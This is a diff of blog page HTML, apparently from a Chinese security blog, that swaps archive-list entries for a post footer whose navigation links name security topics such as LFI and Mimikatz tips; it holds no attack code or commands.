-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:10:48+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/df6dc829.html" itemprop="url">
-              
-                <span itemprop="name">「应急响应」应急响应实战笔记,一个安全工程师的自我修养</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:10:02+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/2db90a41.html" itemprop="url">
-              
-                <span itemprop="name">「前端钓鱼欺骗」前端黑魔法之远程控制地址栏</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:09:37+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/8946a683.html" rel="next" title="LFI SSH日志">
+                <i class="fa fa-chevron-left"></i> LFI SSH日志
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/e83f08e9.html" rel="prev" title="Mimikatz 使用Tips">
+                Mimikatz 使用Tips <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/2019/page/2/">2</a><a class="page-number" href="/archives/2019/page/3/">3</a><a class="extend next" rel="next" href="/archives/2019/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -688,6 +591,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -934,6 +844,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
